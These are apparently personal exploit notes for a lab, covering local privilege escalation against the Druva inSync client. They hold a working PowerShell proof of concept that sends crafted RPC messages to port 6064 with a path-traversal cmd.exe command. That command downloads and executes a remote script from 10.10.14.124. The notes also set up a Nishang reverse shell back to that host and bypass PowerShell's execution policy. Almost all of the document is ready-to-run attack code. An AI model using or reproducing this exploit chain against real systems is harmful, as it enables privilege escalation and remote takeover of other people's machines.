# Druva
Reconnaice
```
get-service | ? {$_.DisplayName -like 'Druva*'}
```
POC
```
$ErrorActionPreference = "Stop"

$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.124:8000/shell.ps1')"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```
In the bottom of the [ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) add
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.124 -Port 6969
```
Bypass Policy
```
Set-ExecutionPolicy Bypass -Scope Process
```
